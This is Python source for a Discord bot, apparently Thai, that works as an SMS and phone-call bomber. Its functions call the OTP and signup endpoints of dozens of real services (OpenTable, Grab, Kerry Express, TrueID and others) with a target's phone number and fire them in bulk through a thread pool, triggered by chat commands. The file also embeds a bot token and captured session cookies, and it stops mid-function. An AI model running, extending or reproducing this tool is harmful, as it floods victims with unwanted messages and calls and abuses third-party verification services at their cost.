import discord,time
from requests import post, Session
from re import search
from random import choice
from string import ascii_uppercase, digits
from concurrent.futures import ThreadPoolExecutor
from discord.ext import commands

PREFIX = 'k' #คำนำหน้าตอนใช้คำสั่ง
TOKEN = 'TvHimHCap9yGSSaGtKpOkg' #token ของบอท
SCK = 50
LIMIT = 90 #จำนวนสูงสุดที่ใส่ได้ต่อการยิง 1 ครั้ง

bot = commands.Bot(command_prefix=PREFIX)
bot.remove_command("help")

def randomString(N):
    return ''.join(choice(ascii_uppercase + digits) for _ in range(N))

threading = ThreadPoolExecutor(max_workers=int(100000))
useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.40"

def GET_UA():
    uastrings = ["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36",\
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.72 Safari/537.36",\
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25",\
                "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0",\
                "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36",\
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36",\
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.1.17 (KHTML, like Gecko) Version/7.1 Safari/537.85.10",\
                "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",\
                "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0",\
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36"\
                ]
 
    return random.choice(uastrings)

def newcall(phone):
     post("https://www.opentable.com/dapi/fe/gql",json={"operationName":"SendVerificationCodePhone","variables":{"via":"sms","phoneNumber": phone,"phoneNumberCountryCode":"66"},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"e960cbacc61009abc14739b7f27efbedcfdc82b0a5b5ae573732355568f0c93b"}}},headers={'sec-ch-ua': '""\"Not\\A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',"user-agent": GET_UA(),"x-query-timeout":"2000","content-type":"application/json","accept-encoding":"gzip, deflate, br","accept-language":"th-TH,th;q=0.9,en;q=0.8,vi;q=0.7,km;q=0.6","sec-ch-ua-platform":'"Linux""',"origin":"https://www.opentable.com","accept":"*/*","cookie":"_ga=GA1.1.656183967.1642760457;__gads=ID=2a147d483eab7aec:T=1642760458:S=ALNI_MYecEQms9J5MXzcyvaPZBTnzipR6w;_gcl_au=1.1.697088147.1642760461;_fbp=fb.1.1642760460000.0.6557583648060834;_csrf=e52651fe-6de9-43e5-9fba-0ff5db75b1f2;otuvid=7BD35400-AA5F-43E4-A255-BC4D521CF8EF;OT-SessionId=dff18cc9-d717-4600-a77b-b3dbf3bb55ad;ak_bmsc=FF7BEBE50901779F62BF3E9B3F7ABD63~000000000000000000000000000000~YAAQJbpUb04x33l+AQAAJz6wfw7YcyLZr4qhHZTY8gYEU3fy2TdCFnIisdAG/yqA+qlnNNtu5DL9m9mUrxnrRars34Iyv3MdF6DSxkrfEWBsrBCwrHbctcUE/HGkiGLtoBbfSZ/WRn5qAENz6r1UN4Db5vIJCMMDAZ5GgXLUspv16Qth8quqmrplUW7bqnv78QRpZ/1e+pEMmvpMZCayEHaDv7Bj/3XkIYrxGZTZwqHD5k9pyiG2tDCGHQ9MN0nAB3XJbK/Mjsd2puJFeCcrsah8E+h2enwahWbSkk/sJI/rqzk8wdi5Dbb2k85RDytFLR1jnwTHmwiNLZ2Z8WLzgScMVELY53ZFCqOkdmhuTM7UqFmXFktAAnUFhrxflQE4LlAxhrL6EH526CLHRo04aNWv1JbbN3fcobrk/PPeUko+9okenVi53UvdgQzngAhFMsVspCIsWfIMMEnoQmn7CtmYDJCyj2kodJ7lUNC1a7HT1rRz4/QZdZciyEXGdSLTed/k9KJ82q8tvMn+xQ==;OptanonConsent=isIABGlobal=false&datestamp=Sat+Jan+22+2022+10%3A02%3A03+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.20.0&hosts=&consentId=a9f373aa-d284-4578-b3b7-9bdff9eeb1ea&interactionCount=1&landingPath=https%3A%2F%2Fwww.opentable.com%2F&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1%2CC0010%3A1;_uetsid=d4d6e7a07aa311ec879ddb25210fd2d7;_uetvid=d4d7a1a07aa311eca5958d927f7eed0f;ftc=x=2022-01-22T04%3A02%3A06&c=1&pt1=1&pt2=1;_ga_Y7868SCB6E=GS1.1.1642819679.3.1.1642820534.29;OT-Session-Update-Date=1642820537;bm_sv=2A39CF2E36E5A304AF7E097873A6361E~r04O9Z1KL/zCxTyAYZXvH6mHkW6oAoAxxQzVutm0riOKeIXz5NPnVr59UeWNNaFbO8XaxdQcterBdE4YWhvS0go7o6O75cI5QZjyD+MC23LXfS/8lbAN4ZJbs1zz5TpiU/WC+FDiCtnLZXB039argAdp2dHKVgIFSzrpEOJax9k=","x-csrf-token":"e52651fe-6de9-43e5-9fba-0ff5db75b1f2","ot-page-type":"authentication_start"})
     
def newsms(phone):
    post("https://www.opentable.com/dapi/fe/gql",json={"operationName":"SendVerificationCodePhone","variables":{"via":"call","phoneNumber": phone,"phoneNumberCountryCode":"66"},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"e960cbacc61009abc14739b7f27efbedcfdc82b0a5b5ae573732355568f0c93b"}}},headers={'sec-ch-ua': '""\"Not\\A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',"user-agent": GET_UA(),"x-query-timeout":"2000","content-type":"application/json","accept-encoding":"gzip, deflate, br","accept-language":"th-TH,th;q=0.9,en;q=0.8,vi;q=0.7,km;q=0.6","sec-ch-ua-platform":'"Linux""',"origin":"https://www.opentable.com","accept":"*/*","cookie":"_ga=GA1.1.656183967.1642760457;__gads=ID=2a147d483eab7aec:T=1642760458:S=ALNI_MYecEQms9J5MXzcyvaPZBTnzipR6w;_gcl_au=1.1.697088147.1642760461;_fbp=fb.1.1642760460000.0.6557583648060834;_csrf=e52651fe-6de9-43e5-9fba-0ff5db75b1f2;otuvid=7BD35400-AA5F-43E4-A255-BC4D521CF8EF;OT-SessionId=dff18cc9-d717-4600-a77b-b3dbf3bb55ad;ak_bmsc=FF7BEBE50901779F62BF3E9B3F7ABD63~000000000000000000000000000000~YAAQJbpUb04x33l+AQAAJz6wfw7YcyLZr4qhHZTY8gYEU3fy2TdCFnIisdAG/yqA+qlnNNtu5DL9m9mUrxnrRars34Iyv3MdF6DSxkrfEWBsrBCwrHbctcUE/HGkiGLtoBbfSZ/WRn5qAENz6r1UN4Db5vIJCMMDAZ5GgXLUspv16Qth8quqmrplUW7bqnv78QRpZ/1e+pEMmvpMZCayEHaDv7Bj/3XkIYrxGZTZwqHD5k9pyiG2tDCGHQ9MN0nAB3XJbK/Mjsd2puJFeCcrsah8E+h2enwahWbSkk/sJI/rqzk8wdi5Dbb2k85RDytFLR1jnwTHmwiNLZ2Z8WLzgScMVELY53ZFCqOkdmhuTM7UqFmXFktAAnUFhrxflQE4LlAxhrL6EH526CLHRo04aNWv1JbbN3fcobrk/PPeUko+9okenVi53UvdgQzngAhFMsVspCIsWfIMMEnoQmn7CtmYDJCyj2kodJ7lUNC1a7HT1rRz4/QZdZciyEXGdSLTed/k9KJ82q8tvMn+xQ==;OptanonConsent=isIABGlobal=false&datestamp=Sat+Jan+22+2022+10%3A02%3A03+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.20.0&hosts=&consentId=a9f373aa-d284-4578-b3b7-9bdff9eeb1ea&interactionCount=1&landingPath=https%3A%2F%2Fwww.opentable.com%2F&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1%2CC0010%3A1;_uetsid=d4d6e7a07aa311ec879ddb25210fd2d7;_uetvid=d4d7a1a07aa311eca5958d927f7eed0f;ftc=x=2022-01-22T04%3A02%3A06&c=1&pt1=1&pt2=1;_ga_Y7868SCB6E=GS1.1.1642819679.3.1.1642820534.29;OT-Session-Update-Date=1642820537;bm_sv=2A39CF2E36E5A304AF7E097873A6361E~r04O9Z1KL/zCxTyAYZXvH6mHkW6oAoAxxQzVutm0riOKeIXz5NPnVr59UeWNNaFbO8XaxdQcterBdE4YWhvS0go7o6O75cI5QZjyD+MC23LXfS/8lbAN4ZJbs1zz5TpiU/WC+FDiCtnLZXB039argAdp2dHKVgIFSzrpEOJax9k=","x-csrf-token":"e52651fe-6de9-43e5-9fba-0ff5db75b1f2","ot-page-type":"authentication_start"})

def sck1(phone):
    post("https://api.myfave.com/api/fave/v3/auth",headers={"client_id": "dd7a668f74f1479aad9a653412248b62", "User-Agent": useragent},json={"phone": f"66{phone}"})

def sck2(phone):
    post("https://u.icq.net/api/v65/rapi/auth/sendCode", headers={"User-Agent": useragent}, json={"reqId":"39816-1633012470","params":{"phone": f"+66{phone[1:]}","language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}})

def sck3(phone):
    post("https://api2.1112.com/api/v1/otp/create", headers={"User-Agent": useragent}, data={'phonenumber': phone,'language': "th"})

def sck4(phone):
    post("https://ecomapi.eveandboy.com/v10/user/signup/phone", headers={"User-Agent": useragent}, data={"phone": phone,"password":"123456789Az"})

def sck5(phone):
    post("https://api.1112delivery.com/api/v1/otp/create", headers={"User-Agent": useragent}, data={'phonenumber': phone,'language': "th"})

def sck6(phone):
    post("https://gccircularlivingshop.com/sms/sendOtp", headers={"User-Agent": useragent}, json={"grant_type":"otp","username": f"+66{phone[1:]}","password":"","client":"ecommerce"})

def sck7(phone):
    post("https://shop.foodland.co.th/login/generation", headers={"User-Agent": useragent}, data={"phone": phone})

def sck8(phone):
    post("https://api-shop.diorbeauty.hk/api/th/ecrm/sms_generate_code", headers={"User-Agent": useragent}, data={"number": f"+66{phone[1:]}"})

def sck9(phone):
    post("https://api.sacasino9x.com/api/RegisterService/RequestOTP", headers={"User-Agent": useragent}, json={"Phone": phone})

def sck10(phone):
    post("https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp", headers={"User-Agent": useragent}, data={"phone": phone})

def sck11(phone):
    post("https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code", headers={"User-Agent": useragent}, data={"phone": phone})

def sck12(phone):
    post("https://partner-api.grab.com/grabid/v1/oauth2/otp", headers={"User-Agent": useragent}, json={"client_id":"4ddf78ade8324462988fec5bfc5874c2","transaction_ctx":"null","country_code":"TH","method":"SMS","num_digits":"6","scope":"openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile","phone_number": f"66{phone[1:]}"})

def sck13(phone):
    post("https://api.scg-id.com/api/otp/send_otp", headers={"User-Agent": useragent, "Content-Type": "application/json;charset=UTF-8"},json={"phone_no": phone})

def sck14(phone):
    session = Session()
    searchItem = session.get("https://www.shopat24.com/register/").text
    ReqTOKEN = search("""<input type="hidden" name="_csrf" value="(.*)" />""", searchItem).group(1)
    session.post("https://www.shopat24.com/register/ajax/requestotp/", headers={"User-Agent": useragent, "content-type": "application/x-www-form-urlencoded; charset=UTF-8","X-CSRF-TOKEN": ReqTOKEN}, data={"phoneNumber": phone})

def sck15(phone):
    post("https://prettygaming168-api.auto888.cloud/api/v3/otp/send", headers={"User-Agent": useragent}, data={"tel": phone,"otp_type":"register"})

def sck16(phone):
    post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", headers={"User-Agent": useragent}, json={"on":{"value": phone,"country":"66"},"type":"mobile"})

def sck17(phone):
    post(f"https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/{phone}", headers={"User-Agent": useragent})

def sck18(phone):
    post("https://graph.firster.com/graphql",headers={"User-Agent": useragent, "organizationcode": "lifestyle","content-type": "application/json"}, json={"operationName":"sendOtp","variables":{"input":{"mobileNumber": phone[1:],"phoneCode":"THA-66"}},"query":"mutation sendOtp($input: SendOTPInput!) {\n  sendOTPRegister(input: $input) {\n    token\n    otpReference\n    expirationOn\n    __typename\n  }\n}\n"})

def sck19(phone):
    post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.661", headers={"User-Agent": useragent}, json={"lang":"th","userType":"BUYER","locale":"th","orgIdfier":"scg","phone": f"+66{phone[1:]}","type":"signup","otpTemplate":"buyer_signup_otp_message","userParams":{"buyerName": randomString(10)}})

def sck20(phone):
    post("https://store.boots.co.th/api/v1/guest/register/otp", headers={"User-Agent": useragent}, json={"phone_number":f"+66{phone[1:]}"})

def sck21(phone):
    post("https://m.lucabet168.com/api/register-otp", headers={"User-Agent": useragent} ,json={"brands_id":"609caede5a67e5001164b89d","agent_register":"60a22f7d233d2900110070d7","tel": phone})

def sck22(phone):
    session = Session()
    ReqTOKEN = session.get("https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated", headers={"User-Agent": useragent}).text
    session.post("https://srfng.ais.co.th/login/sendOneTimePW", data=f"msisdn=66{phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",headers={"User-Agent": useragent,"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "authorization": f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", ReqTOKEN).group(1)}'''})

def sck23(phone):
    post(url="https://www.cpffeedonline.com/Customer/RegisterRequestOTP", data={"mobileNumber":f"0{phone}"})

def sck24(phone):
    post(url="https://www.tgfone.com/index.php/signin/otp_chk", data={"mobile":f"0{phone}"})

def sck25(phone):
    post("https://api2.1112.com/api/v1/otp/create", json={"phonenumber":f"0{phone}","language":"th"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

def sck26(phone):
    post("https://unacademy.com/api/v3/user/user_check/", json={"phone":f"0{phone}","country_code":"TH"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

def sck27(phone):
    post(f"http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha?mobile=66-0{phone}")

def sck28(phone):
    post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register", json={"username": f"0{phone}","password":"6302814184624az","name":"0903281894","provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

def sck29(phone):
    post("https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp", data={"phone": f"0{phone}"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

def sck30(phone):
    post("https://www.berlnw.com/reservelogin", data={"p_myreserve": f"0{phone}"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

def sck31(phone):
    post("https://www.kickoff28.com/action.php?mode=PreRegister", data={"tel": f"0{phone}"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

def sck32(phone):
    post("https://1ufabet.com/_ajax_/request-otp", data={"request_otp[phoneNumber]": f"0{phone}", "request_otp[termAndCondition]": "1", "request_otp[_token]": "XBNcvQIzJK1pjh_2T0BBzLiDa6vSivktDN317mbw3ws"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

def sck33(phone):
    post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username": phone,"password":"1111a1111A","name":"djdssjssk","provinceCode":"74","districtCode":"970","subdistrictCode":"8654","zipcode":"94140","siebelCustomerTypeId":"710","locale":"th_TH"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
    
def sck34(phone):
         post("https://vaccine.trueid.net/vacc-verify/api/getotp",json={"msisdn":phone,"function":"enroll"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})   

def startall(phone, amount):
    for _ in range(amount):
        threading.submit(sck1, phone)
        threading.submit(sck2, phone)
        threading.submit(sck3, phone)
        threading.submit(newcall, phone)
        threading.submit(newsms, phone)
        threading.submit(sck4, phone)
        threading.submit(sck5, phone)
        threading.submit(sck6, phone)
        threading.submit(sck7, phone)
        threading.submit(sck8, phone)
        threading.submit(sck9, phone)
        threading.submit(sck10, phone)
        threading.submit(sck11, phone)
        threading.submit(sck12, phone)
        threading.submit(sck13, phone)
        threading.submit(sck14, phone)
        threading.submit(sck15, phone)
        threading.submit(sck16, phone)
        threading.submit(sck17, phone)
        threading.submit(sck18, phone)
        threading.submit(sck19, phone)
        threading.submit(sck20, phone)
        threading.submit(sck21, phone)
        threading.submit(sck22, phone)
        threading.submit(sck23, phone)
        threading.submit(sck24, phone)
        threading.submit(sck25, phone)
        threading.submit(sck26, phone)
        threading.submit(sck27, phone)
        threading.submit(sck28, phone)
        threading.submit(sck29, phone)
        threading.submit(sck30, phone)
        threading.submit(sck31, phone)
        threading.submit(sck33, phone)
        threading.submit(sck32, phone)
        threading.submit(sck33, phone)
        
        

def sx(lphone, amount):
    for _ in range(amount):
        threading.submit(newcall2, lphone)
        threading.submit(newsms2, lphone)
        
def newcall2(lphone):
     post("https://www.opentable.com/dapi/fe/gql",json={"operationName":"SendVerificationCodePhone","variables":{"via":"sms","phoneNumber": lphone,"phoneNumberCountryCode":"66"},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"e960cbacc61009abc14739b7f27efbedcfdc82b0a5b5ae573732355568f0c93b"}}},headers={'sec-ch-ua': '""\"Not\\A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',"user-agent": GET_UA(),"x-query-timeout":"2000","content-type":"application/json","accept-encoding":"gzip, deflate, br","accept-language":"th-TH,th;q=0.9,en;q=0.8,vi;q=0.7,km;q=0.6","sec-ch-ua-platform":'"Linux""',"origin":"https://www.opentable.com","accept":"*/*","cookie":"_ga=GA1.1.656183967.1642760457;__gads=ID=2a147d483eab7aec:T=1642760458:S=ALNI_MYecEQms9J5MXzcyvaPZBTnzipR6w;_gcl_au=1.1.697088147.1642760461;_fbp=fb.1.1642760460000.0.6557583648060834;_csrf=e52651fe-6de9-43e5-9fba-0ff5db75b1f2;otuvid=7BD35400-AA5F-43E4-A255-BC4D521CF8EF;OT-SessionId=dff18cc9-d717-4600-a77b-b3dbf3bb55ad;ak_bmsc=FF7BEBE50901779F62BF3E9B3F7ABD63~000000000000000000000000000000~YAAQJbpUb04x33l+AQAAJz6wfw7YcyLZr4qhHZTY8gYEU3fy2TdCFnIisdAG/yqA+qlnNNtu5DL9m9mUrxnrRars34Iyv3MdF6DSxkrfEWBsrBCwrHbctcUE/HGkiGLtoBbfSZ/WRn5qAENz6r1UN4Db5vIJCMMDAZ5GgXLUspv16Qth8quqmrplUW7bqnv78QRpZ/1e+pEMmvpMZCayEHaDv7Bj/3XkIYrxGZTZwqHD5k9pyiG2tDCGHQ9MN0nAB3XJbK/Mjsd2puJFeCcrsah8E+h2enwahWbSkk/sJI/rqzk8wdi5Dbb2k85RDytFLR1jnwTHmwiNLZ2Z8WLzgScMVELY53ZFCqOkdmhuTM7UqFmXFktAAnUFhrxflQE4LlAxhrL6EH526CLHRo04aNWv1JbbN3fcobrk/PPeUko+9okenVi53UvdgQzngAhFMsVspCIsWfIMMEnoQmn7CtmYDJCyj2kodJ7lUNC1a7HT1rRz4/QZdZciyEXGdSLTed/k9KJ82q8tvMn+xQ==;OptanonConsent=isIABGlobal=false&datestamp=Sat+Jan+22+2022+10%3A02%3A03+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.20.0&hosts=&consentId=a9f373aa-d284-4578-b3b7-9bdff9eeb1ea&interactionCount=1&landingPath=https%3A%2F%2Fwww.opentable.com%2F&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1%2CC0010%3A1;_uetsid=d4d6e7a07aa311ec879ddb25210fd2d7;_uetvid=d4d7a1a07aa311eca5958d927f7eed0f;ftc=x=2022-01-22T04%3A02%3A06&c=1&pt1=1&pt2=1;_ga_Y7868SCB6E=GS1.1.1642819679.3.1.1642820534.29;OT-Session-Update-Date=1642820537;bm_sv=2A39CF2E36E5A304AF7E097873A6361E~r04O9Z1KL/zCxTyAYZXvH6mHkW6oAoAxxQzVutm0riOKeIXz5NPnVr59UeWNNaFbO8XaxdQcterBdE4YWhvS0go7o6O75cI5QZjyD+MC23LXfS/8lbAN4ZJbs1zz5TpiU/WC+FDiCtnLZXB039argAdp2dHKVgIFSzrpEOJax9k=","x-csrf-token":"e52651fe-6de9-43e5-9fba-0ff5db75b1f2","ot-page-type":"authentication_start"})
     
def newsms2(lphone):
    post("https://www.opentable.com/dapi/fe/gql",json={"operationName":"SendVerificationCodePhone","variables":{"via":"call","phoneNumber": lphone,"phoneNumberCountryCode":"66"},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"e960cbacc61009abc14739b7f27efbedcfdc82b0a5b5ae573732355568f0c93b"}}},headers={'sec-ch-ua': '""\"Not\\A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',"user-agent": GET_UA(),"x-query-timeout":"2000","content-type":"application/json","accept-encoding":"gzip, deflate, br","accept-language":"th-TH,th;q=0.9,en;q=0.8,vi;q=0.7,km;q=0.6","sec-ch-ua-platform":'"Linux""',"origin":"https://www.opentable.com","accept":"*/*","cookie":"_ga=GA1.1.656183967.1642760457;__gads=ID=2a147d483eab7aec:T=1642760458:S=ALNI_MYecEQms9J5MXzcyvaPZBTnzipR6w;_gcl_au=1.1.697088147.1642760461;_fbp=fb.1.1642760460000.0.6557583648060834;_csrf=e52651fe-6de9-43e5-9fba-0ff5db75b1f2;otuvid=7BD35400-AA5F-43E4-A255-BC4D521CF8EF;OT-SessionId=dff18cc9-d717-4600-a77b-b3dbf3bb55ad;ak_bmsc=FF7BEBE50901779F62BF3E9B3F7ABD63~000000000000000000000000000000~YAAQJbpUb04x33l+AQAAJz6wfw7YcyLZr4qhHZTY8gYEU3fy2TdCFnIisdAG/yqA+qlnNNtu5DL9m9mUrxnrRars34Iyv3MdF6DSxkrfEWBsrBCwrHbctcUE/HGkiGLtoBbfSZ/WRn5qAENz6r1UN4Db5vIJCMMDAZ5GgXLUspv16Qth8quqmrplUW7bqnv78QRpZ/1e+pEMmvpMZCayEHaDv7Bj/3XkIYrxGZTZwqHD5k9pyiG2tDCGHQ9MN0nAB3XJbK/Mjsd2puJFeCcrsah8E+h2enwahWbSkk/sJI/rqzk8wdi5Dbb2k85RDytFLR1jnwTHmwiNLZ2Z8WLzgScMVELY53ZFCqOkdmhuTM7UqFmXFktAAnUFhrxflQE4LlAxhrL6EH526CLHRo04aNWv1JbbN3fcobrk/PPeUko+9okenVi53UvdgQzngAhFMsVspCIsWfIMMEnoQmn7CtmYDJCyj2kodJ7lUNC1a7HT1rRz4/QZdZciyEXGdSLTed/k9KJ82q8tvMn+xQ==;OptanonConsent=isIABGlobal=false&datestamp=Sat+Jan+22+2022+10%3A02%3A03+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.20.0&hosts=&consentId=a9f373aa-d284-4578-b3b7-9bdff9eeb1ea&interactionCount=1&landingPath=https%3A%2F%2Fwww.opentable.com%2F&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1%2CC0010%3A1;_uetsid=d4d6e7a07aa311ec879ddb25210fd2d7;_uetvid=d4d7a1a07aa311eca5958d927f7eed0f;ftc=x=2022-01-22T04%3A02%3A06&c=1&pt1=1&pt2=1;_ga_Y7868SCB6E=GS1.1.1642819679.3.1.1642820534.29;OT-Session-Update-Date=1642820537;bm_sv=2A39CF2E36E5A304AF7E097873A6361E~r04O9Z1KL/zCxTyAYZXvH6mHkW6oAoAxxQzVutm0riOKeIXz5NPnVr59UeWNNaFbO8XaxdQcterBdE4YWhvS0go7o6O75cI5QZjyD+MC23LXfS/8lbAN4ZJbs1zz5TpiU/WC+FDiCtnLZXB039argAdp2dHKVgIFSzrpEOJax9k=","x-csrf-token":"e52651fe-6de9-43e5-9fba-0ff5db75b1f2","ot-page-type":"authentication_start"})


def nocz(phonee):
    post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.661", headers={"User-Agent": useragent}, json={"lang":"th","userType":"BUYER","locale":"th","orgIdfier":"scg","phone": f"+66{phonee[1:]}","type":"signup","otpTemplate":"buyer_signup_otp_message","userParams":{"buyerName": randomString(10)}})
    
def ht(phonee):
         post("https://vaccine.trueid.net/vacc-verify/api/getotp",json={"msisdn":phonee,"function":"enroll"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})    
def hy(phonee):
    post("https://topping.truemoveh.com/api/get_request_otp",data={"mobile_number": phonee},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
    
def hj(phonee):
    post("https://www.monomax.me/api/v2/signup/telno",json ={"password":"12345678+","telno": phonee, },headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"}) 
 
def fuck(phonee):
    post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username": phonee,"password":"1111a1111A","name":"djdssjssk","provinceCode":"74","districtCode":"970","subdistrictCode":"8654","zipcode":"94140","siebelCustomerTypeId":"710","locale":"th_TH"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
 
def nocza(phonee, aamout):
    for _ in range(aamout):
        threading.submit(fuck, phonee)
        threading.submit(ht, phonee)
        threading.submit(hy, phonee)   
        threading.submit(hj, phonee)
        threading.submit(nocz, phonee)       
                       



@bot.event
async def on_command_error(ctx, error):
    print(str(error))

@bot.event
async def on_connect():
    print(f"Login as : {bot.user.name}#{bot.user.discriminator}")

@bot.command()
async def help(ctx):
    await ctx.send(f"> **คำสั่งยิงเบอร์** | {PREFIX}sms [เบอร์] [จำนวน1- {str(LIMIT)}ครั้ง]",delete_after=15)
    await ctx.send(f"> **คำสั่งยิง รัวๆ 5api** | {PREFIX}er [เบอร์] [จำนวน1- {str(SCK)}ครั้ง]",delete_after=15)
    await ctx.send(f"> =chk  เช็คสถานะ SpamerBOT",delete_after=15)
    await ctx.message.delete()
    
@bot.command()
async def chk(ctx):
    await ctx.send(f"สถานะ: SMSALL \n  ",delete_after=20)
    await ctx.send(f"สถานะ: 5api [•√]",delete_after=20)
    
    await ctx.message.delete()


@bot.command()
async def sms(ctx, phone=None, amount=None):
    if (str(ctx.message.channel.id) == '927941187904626729'):
        if (phone == None or amount == None):
            await ctx.send("> กรุณาใส่ข้อมูลให้ครบถ้วน",delete_after=15)
            await ctx.message.delete()
            
        else:
            try:
                amount = int(amount)
                if (amount > LIMIT):
                    await ctx.send(f"> กรุณาใส่จำนวนไม่เกิน {str(LIMIT)}",delete_after=15)
                    await ctx.message.delete()

                else:
                    await ctx.send(f"> เริ่มยิงไปที่เบอร์ **{phone}** แล้ว | จำนวน **{amount}**ครั้ง",delete_after=15)
                    startall(phone, amount)
                    await ctx.message.delete()

            except:
